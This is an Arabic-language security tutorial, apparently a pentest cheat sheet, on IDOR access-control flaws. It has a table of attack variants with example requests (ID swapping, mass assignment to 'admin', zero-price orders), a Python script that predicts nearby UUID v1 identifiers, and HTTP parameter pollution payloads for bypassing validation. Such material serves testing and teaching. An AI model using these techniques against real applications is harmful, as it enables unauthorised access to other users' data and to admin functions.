02

نظرة عامة — ما هو IDOR؟

Insecure Direct Object Reference (IDOR) هو ثغرة في Access Control تنشأ حين يستخدم التطبيق مدخلات المستخدم مباشرةً للوصول إلى كائنات (Objects) في قاعدة البيانات أو نظام الملفات دون التحقق من صلاحية المستخدم. جُذور الثغرة هي الافتراض الخاطئ: "إذا كان المستخدم مُسجَّل دخوله، فهو مُخوَّل للوصول لأي مورد يطلبه."

النوع الوصف مثال الخطورة
Horizontal IDOR مستخدم يصل لبيانات مستخدم آخر بنفس المستوى GET /profile?id=123 → id=124 HIGH
Vertical IDOR مستخدم يصل لوظائف أو بيانات تخص دور أعلى (Admin) GET /admin/users/5 CRITICAL
Blind IDOR الاستغلال يحدث دون رؤية النتيجة مباشرةً في الاستجابة DELETE /messages/456 HIGH
GraphQL IDOR معالجات GraphQL لا تتحقق من ملكية الكائن query { user(id: "999") { email } } CRITICAL
File/Path IDOR الوصول لملفات مستخدمين آخرين عبر اسم الملف أو مساره /uploads/invoice_1001.pdf → 1002.pdf HIGH
API Endpoint IDOR REST API لا يتحقق من صلاحية الـ JWT مقابل الـ resource ID GET /api/v1/orders/{order_id} CRITICAL
Mass Assignment IDOR تعديل حقول لا يجب للمستخدم تعديلها عبر JSON body {"user_id": 999, "role": "admin"} CRITICAL
UUID/Hash IDOR معرفات UUID أو MD5 مُسرَّبة عبر endpoint آخر ?id=e4da3b7fbbce2345d... MEDIUM
Price Manipulation IDOR تعديل معرف الطلب للحصول على سعر مختلف أو مجاني {"order_id": "999", "price": 0} CRITICAL
Cookie/Header IDOR معرف المستخدم في Cookie أو Header قابل للتعديل X-User-ID: 123 → 124 HIGH

▼ ADV-02
UUID IDOR — كسر وهم الأمان في UUIDs
HIGH Advanced
المفهوم

UUIDs ليست آمنة من IDOR تلقائياً. إذا تسرّب UUID مستخدم من endpoint آخر (صورة profile، public API، logs)، يمكن استخدامه. UUID v1 يعتمد على timestamp وMAC address — يمكن التنبؤ به في بعض الحالات.

أين تجد UUID تسريبات
# 1. Profile pictures — filename = user UUID
https://cdn.example.com/avatars/3f2504e0-4f89-11d3-9a0c-0305e82c3301.jpg
                                 ↑ UUID تسريب من public endpoint!

# 2. Public posts/comments — author_id field
GET /api/posts/123
{"author_id": "3f2504e0-4f89-11d3-9a0c-0305e82c3301"}

# 3. Email links — password reset tokens
https://example.com/reset?token=3f2504e0-4f89-11d3-9a0c-0305e82c3301

# Now use leaked UUID in privileged endpoint:
GET /api/admin/users/3f2504e0-4f89-11d3-9a0c-0305e82c3301/details
UUID v1 Prediction
import uuid
from datetime import datetime, timedelta

# UUID v1 contains timestamp — can predict nearby UUIDs
known_uuid = uuid.UUID('3f2504e0-4f89-11d3-9a0c-0305e82c3301')
timestamp = known_uuid.time

# Generate UUIDs from nearby timestamps (same MAC)
for i in range(-100, 100):
    predicted = uuid.UUID(fields=(
        (timestamp + i) & 0xFFFFFFFF,
        (timestamp + i) >> 32 & 0xFFFF,
        known_uuid.time_hi_version,
        known_uuid.clock_seq_hi_variant,
        known_uuid.clock_seq_low,
        known_uuid.node
    ), version=1)
    print(predicted)
▼ ADV-03
HTTP Parameter Pollution لتجاوز IDOR Validation
HIGH Bypass Technique
المفهوم

بعض الـ frameworks تُعالج parameter مكرر بطريقة مختلفة. إرسال نفس الـ parameter مرتين — واحد للـ validation والآخر للـ actual processing.

أمثلة على Pollution
# Standard request (validated):
GET /api/profile?user_id=123  ← check passes (own ID)

# HPP Attack — duplicate parameter:
GET /api/profile?user_id=123&user_id=456
# PHP takes LAST: processes user 456
# WAF validates FIRST: sees user 123 (OK)

# ASP.NET: takes comma-separated "123,456"
# Express.js: takes array [123, 456]
# Flask: takes first "123" — depends on config

# JSON body HPP:
{
  "user_id": 123,   ← validation sees this
  "user_id": 456    ← some parsers use this
}
